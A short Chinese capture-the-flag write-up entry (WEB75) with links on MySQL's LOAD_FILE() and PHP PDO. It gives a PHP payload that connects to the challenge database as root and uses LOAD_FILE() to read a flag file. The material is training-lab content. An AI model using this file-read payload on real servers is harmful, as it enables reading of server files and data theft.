## WEB75:

[在MySQL中如何使用LOAD_FILE()函数？](https://www.cnblogs.com/texley/p/php.cn/mysql-tutorials-416583.html#:~:text=%E5%9C%A8MySQL%E4%B8%AD%EF%BC%8CLOAD_FILE%20%28%29%E5%87%BD%E6%95%B0%E8%AF%BB%E5%8F%96%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E5%B9%B6%E5%B0%86%E5%85%B6%E5%86%85%E5%AE%B9%E4%BD%9C%E4%B8%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%94%E5%9B%9E%E3%80%82%20%E5%85%B6%E4%B8%ADfile_name%E6%98%AF%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84%E3%80%82%20%E5%9C%A8%E6%9C%AC%E4%BE%8B%E4%B8%AD%EF%BC%8C%E5%88%97MyBlobColumn%E6%9C%89%E4%B8%80%E4%B8%AABLOB%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B,%28%E5%85%81%E8%AE%B8%E5%AE%83%E5%AD%98%E5%82%A8%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%29%E3%80%82%201.%E6%96%87%E4%BB%B6%E5%BF%85%E9%A1%BB%E4%BD%8D%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%BB%E6%9C%BA%E4%B8%8A%E3%80%82%202.%E4%BD%A0%E5%BF%85%E9%A1%BB%E5%85%B7%E6%9C%89%E8%AF%A5FILE%E6%9D%83%E9%99%90%E6%89%8D%E8%83%BD%E8%AF%BB%E5%8F%96%E8%AF%A5%E6%96%87%E4%BB%B6%E3%80%82%20%E6%8B%A5%E6%9C%89%E8%AF%A5FILE%E6%9D%83%E9%99%90%E7%9A%84%E7%94%A8%E6%88%B7%E5%8F%AF%E4%BB%A5%E8%AF%BB%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E4%BB%BB%E4%BD%95%E6%96%87%E4%BB%B6%EF%BC%8C%E8%AF%A5%E6%96%87%E4%BB%B6%E6%98%AFworld-readable%E7%9A%84%E6%88%96MySQL%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%AF%E8%AF%BB%E7%9A%84%E3%80%82)

[PHP:PDO](https://www.php.net/manual/zh/book.pdo.php)

就是利用mysql的load_file()来查看文件，PDO提供了数据访问的抽象层，不论用哪种类型的数据库都可以用PDO来实现它的驱动并调用数据库。

Payload

```
try{
    $db = new PDO("mysql:host=localhost;dbname=ctftraining","root","root");
    foreach($db->query('select load_file("/flag36.txt")') as $row)
    {
        echo ($row[0])."|";
    }
    $db = null;
}
catch(PDOException $e)
{
    echo $e->getMessage();
    exit(0);
}
exit(0);
```

